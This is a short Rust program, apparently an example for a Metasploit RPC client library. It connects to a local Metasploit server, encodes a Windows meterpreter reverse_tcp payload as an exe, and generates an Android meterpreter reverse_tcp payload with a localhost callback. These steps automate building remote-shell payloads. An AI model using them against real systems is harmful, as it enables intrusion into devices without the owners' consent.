use metasploit::client::Client;
use metasploit::msf::modules;
use std::collections::HashMap;
use metasploit::value::Value;
fn main() {
    let client=Client::new("127.0.0.1",55552,"user","password",true);
    let list=modules::list::new(client.clone());
    //println!("{:?}",list.payloads().unwrap());
    println!("{:?}",modules::info(client.clone(),"payload".to_string(),"android/meterpreter/reverse_tcp".to_string()).unwrap());
    let comp=modules::compactible::new("multi/handler".to_string(),client.clone());
    //println!("{:?}",comp.payload().unwrap());
    //println!("{:?}",comp.sessions().unwrap());
    //println!("{:?}",comp.target_payloads(1).unwrap());
    //println!("{:?}",modules::option(client.clone(),"payload".to_string(),"android/meterpreter/reverse_tcp".to_string()).unwrap());
    let mut dat=HashMap::new();
    dat.insert("format".to_string(),"exe".to_string());
    dat.insert("arch".to_string(),"x86".to_string());
    match modules::encoder(client.clone(),"multi/handler".to_string(),"windows/meterpreter/reverse_tcp".to_string(),dat) {
        Ok(ref val) => {
            println!("{:?}",val);
        },
        Err(ref val) => {
            println!("{}",val.error_string);
        },
    }
    dat=HashMap::new();
    dat.insert("LHOST".to_string(),"127.0.0.1".to_string());
    dat.insert("LPORT".to_string(),"4040".to_string());
    match modules::execute(client.clone(),"payload".to_string(),"android/meterpreter/reverse_tcp".to_string(),dat).unwrap() {
        Value::Binary(ref val) => println!("{}",String::from_utf8_lossy(&val)),
        _ => println!("Another value returned"),
    }
}
